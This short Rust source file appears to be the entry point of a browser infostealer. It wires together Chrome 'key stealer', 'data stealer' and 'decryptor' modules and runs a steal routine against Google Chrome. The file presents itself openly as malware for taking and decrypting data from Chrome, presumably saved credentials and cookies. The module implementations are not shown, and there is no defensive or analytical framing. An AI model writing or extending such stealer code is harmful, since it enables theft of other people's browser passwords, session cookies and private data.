mod data_stealers;
mod decryptors;
mod key_stealers;
mod stealer;

// Function to steal data from Google Chrome
fn steal_google_chrome() {
    let stealer = stealer::Stealer::new(
        Box::new(key_stealers::ChromeKeyStealer::new()),
        Box::new(data_stealers::ChromeDataStealer::new()),
        Box::new(decryptors::ChromeDecryptor::new()),
    );

    stealer.steal();
}

fn main() {
    steal_google_chrome();
}
